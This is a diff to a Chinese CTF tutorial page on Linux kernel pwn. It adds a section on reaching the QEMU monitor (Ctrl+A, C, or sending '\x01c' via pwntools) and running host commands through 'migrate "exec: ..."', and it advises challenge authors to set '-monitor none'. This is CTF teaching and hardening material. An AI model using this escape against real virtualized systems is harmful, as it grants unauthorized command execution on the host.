@@ -10,6 +10,9 @@ comments: true
 - [1. kernel 环境搭建](#1-kernel-环境搭建)
   - [1.1 自安装](#11-自安装)
   - [1.2 一键式脚本](#12-一键式脚本)
+  - [1.3 kernel debug](#13-kernel-debug)
+- [特典: kernel pwn tricks:](#特典-kernel-pwn-tricks)
+  - [特典一：qemu monitor模式](#特典一qemu-monitor模式)
 
 
 # 1. kernel 环境搭建<br>
@@ -30,6 +33,51 @@ pwn.college提供了一键式脚本:<br>
 直接运行即可，方便快捷~<br>
 考虑到仓库的更新时间，使用ubuntu22虚拟机会是个比较好的选择。<br>
 
+## 1.3 kernel debug<br>
+
+
+
+
+# 特典: kernel pwn tricks:<br>
+这些特典或许不能帮助我们理解kernel，但是可以帮助我们ctf题目中快速拿分！<br>
+## 特典一：qemu monitor模式<br>
+`QEMU monitor` 是 QEMU 内置的一个交互式控制台窗口，主要用于监控和管理虚拟机的状态。由于 Linux kernel pwn 题目通常使用 QEMU 创建虚拟机环境，因此若是未禁止选手对 QEMU monitor 的访问，则选手可以直接获得整个虚拟机的访问权限。同时，由于 QEMU monitor 支持在 host 侧执行命令，因此也可以直接读取题目环境中的 flag，这同时意味着我们还能可以利用 QEMU monitor 完成虚拟化逃逸。<br>
+***对于出题人而言，应当时刻保证 QEMU 的参数包含一行 -monitor none 或是 -monitor /dev/null 以确保选手无法访问 QEMU monitor。***<br>
+通常情况下，进入 QEMU monitor 的方法如下:<br>
+```
+1. 首先同时按下 CTRL + A
+2. 接下来按 C
+```
+使用 pwntools 脚本时，可以通过发送 `"\x01c"` 完成，例如：<br>
+```python
+p = remote("localhost", 11451)
+p.send(b"\x01c")
+```
+在 QEMU monitor 当中有一条比较好用的指令叫做`migrate`，其支持我们执行特定的 URI：<br>
+```
+(qemu) help migrate
+migrate [-d] [-r] uri -- migrate to URI (using -d to not wait for completion)
+                         -r to resume a paused postcopy migration
+```
+其中，**`URI 可以是 'exec:<command>' 或 tcp:<ip:port>`**，前者支持我们直接在宿主机上执行命令，例如下面的命令在宿主机上执行了 ls 命令：<br>
+```
+migrate "exec: sh -c ls"
+```
+有的时候可能会由于一些特殊原因遇到没有输出的情况，这个时候可以尝试将 stdout 重定向至 stderr，例如：
+```
+(qemu) migrate "exec: whoami"
+qemu-system-x86_64: failed to save SaveStateEntry with id(name): 2(ram): -5
+qemu-system-x86_64: Unable to write to command: Broken pipe
+qemu-system-x86_64: Unable to write to command: Broken pipe
+(qemu) migrate "exec: whoami 1>&2"
+arttnba3
+qemu-system-x86_64: failed to save SaveStateEntry with id(name): 2(ram): -5
+qemu-system-x86_64: Unable to write to command: Broken pipe
+qemu-system-x86_64: Unable to write to command: Broken pipe
+(qemu) 
+```
+
+[https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/tricks/qemu-monitor/](https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/tricks/qemu-monitor/)<br>
 
 
 <!-- Google tag (gtag.js) -->
